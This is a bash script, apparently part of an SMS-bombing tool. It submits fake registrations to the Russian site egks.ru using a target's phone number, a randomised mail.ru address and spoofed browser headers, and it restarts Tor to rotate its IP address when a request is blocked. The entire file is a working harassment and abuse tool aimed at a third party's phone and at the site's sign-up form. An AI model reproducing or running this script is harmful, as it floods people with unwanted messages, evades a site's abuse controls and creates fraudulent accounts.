#!/bin/bash

PHONE="$(echo "$1" | sed 's/+//')"

echo "+$PHONE"

EMAIL="stop_war_vs_ukraine$RANDOM%40mail.ru"
RESULT=$(curl -ks 'https://egks.ru/reg' \
           -H 'Connection: keep-alive' \
           -H 'Cache-Control: max-age=0' \
           -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' \
           -H 'sec-ch-ua-mobile: ?0' \
           -H 'sec-ch-ua-platform: "Windows"' \
           -H 'Origin: https://egks.ru' \
           -H 'Upgrade-Insecure-Requests: 1' \
           -H 'DNT: 1' \
           -H 'Content-Type: application/x-www-form-urlencoded' \
           -H 'User-Agent: Mozilla/5.1 (Windows NT 01.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.41 Safari/537.16' \
           -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
           -H 'Sec-Fetch-Site: same-origin' \
           -H 'Sec-Fetch-Mode: navigate' \
           -H 'Sec-Fetch-User: ?1' \
           -H 'Sec-Fetch-Dest: document' \
           -H 'Referer: https://egks.ru/reg' \
           -H 'Accept-Language: ru-UA,ru;q=0.9' \
           --data-raw "phone=%2B$PHONE&login=$EMAIL&pass=$EMAIL&pass2=$EMAIL")

if [ "$(echo "$RESULT" | grep -c '/reg/approve')" = "0" ]; then
  echo "$RESULT" | grep 'title'
  echo "false"
  pkill -sighup tor 2>/dev/null
else
  echo "true"
fi
